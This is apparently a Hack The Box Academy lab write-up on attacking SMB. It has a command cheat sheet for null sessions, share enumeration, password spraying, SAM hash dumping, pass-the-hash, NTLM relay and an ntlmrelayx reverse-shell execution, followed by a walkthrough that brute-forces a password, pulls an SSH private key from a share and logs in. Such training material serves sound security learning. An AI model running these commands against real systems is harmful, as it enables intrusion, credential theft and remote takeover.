## [Attacking SMB](https://referral.hackthebox.com/mzyGKZb)


| Command | Description |
|---------|-------------|
| `smbclient -N -L //$TARGET_IP` | Null-session testing against the SMB service. |
| `smbmap -H $TARGET_IP` | Network share enumeration using smbmap. |
| `smbmap -H $TARGET_IP -r notes` | Recursive network share enumeration using smbmap. |
| `smbmap -H $TARGET_IP --download "notes\note.txt"` | Download a specific file from the shared folder. |
| `smbmap -H $TARGET_IP --upload test.txt "notes\test.txt"` | Upload a specific file to the shared folder. |
| `rpcclient -U'%' $TARGET_IP` | Null-session with the rpcclient. |
| `./enum4linux-ng.py $TARGET_IP -A -C` | Automated enumeration of the SMB service using enum4linux-ng. |
| `crackmapexec smb $TARGET_IP -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list. |
| `impacket-psexec administrator:'Password123!'@$TARGET_IP` | Connect to the SMB service using the impacket-psexec. |
| `crackmapexec smb $TARGET_IP -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Execute a command over the SMB service using crackmapexec. |
| `crackmapexec smb $TARGET_IP/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerating Logged-on users. |
| `crackmapexec smb $TARGET_IP -u administrator -p 'Password123!' --sam` | Extract hashes from the SAM database. |
| `crackmapexec smb $TARGET_IP -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Use the Pass-The-Hash technique to authenticate on the target host. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP` | Dump the SAM database using impacket-ntlmrelayx. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP -c 'powershell -e <base64 reverse shell>'` | Execute a PowerShell-based reverse shell using impacket-ntlmrelayx. |



## Questions:

### 1. What is the name of the shared folder with READ permissions?

```
smbmap -H $TARGET_IP
[+] IP: TARGET_IP:445	Name: TARGET                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)

```

### 2. What is the password for the username "jason"?
* First, load pwd.list from resources.
```
crackmapexec smb $TARGET_IP -u jason -p pwd.list --local-auth
```

### 3. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

``` 
smbclient  //$TARGET_IP/GGJ -U 'jason%$PASSWORD' -

smb: \> ls
  .                                   D        0  Tue Apr 19 16:33:55 2022
  ..                                  D        0  Mon Apr 18 12:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 16:33:04 2022

		14384136 blocks of size 1024. 10088352 blocks available
smb: \> get id_rsa
getting file \id_rsa of size 3381 as id_rsa (89.2 KiloBytes/sec) (average 89.2 KiloBytes/sec)
smb: \> !cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA1RKythwhDQVnsZpGDDeIWh/z0a4y5mQoIIBXOeHJM8rLNzB/fdMD
XvN+6R6s0wh/fpava2en2s/G6m8OGjjY8DbgO0A40HwzKyVEKk15tJ9QlcaqS0O77UrjW/
...
<SNIP>
....
```
```
 [★]$ ls
cacert.der  Documents  id_rsa  Pictures  pwd.list   Videos
Desktop     Downloads  Music   Public    Templates

```
```
chmod 600 id_rsa
ssh -i id_rsa jason@$TARGET_IP
cat flag.txt
HTB{SMB_*******_*********9}
```
# [Subscribe for getting more HTB Cubes!](https://referral.hackthebox.com/mzyGKZb)
